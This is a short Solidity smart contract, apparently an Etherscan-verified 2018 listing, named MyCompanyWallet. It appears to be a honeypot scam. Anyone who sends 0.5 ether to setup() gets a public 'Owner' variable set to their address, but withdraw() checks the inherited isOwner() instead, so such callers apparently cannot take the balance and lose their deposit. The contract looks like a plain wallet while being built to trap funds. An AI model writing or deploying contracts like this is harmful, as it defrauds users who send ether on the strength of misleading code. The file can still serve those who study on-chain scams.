/**

 *Submitted for verification at Etherscan.io on 2018-09-04

*/



pragma solidity ^0.4.24;







contract MyCompanyWallet is Ownable {

    address public Owner;

    

    function setup() public payable {

        if (msg.value >= 0.5 ether) {

            Owner = msg.sender;

        }

    }

    

    function withdraw() public {

        if (isOwner()) {

            msg.sender.transfer(address(this).balance);

        }

    }

    

    function() public payable { }

}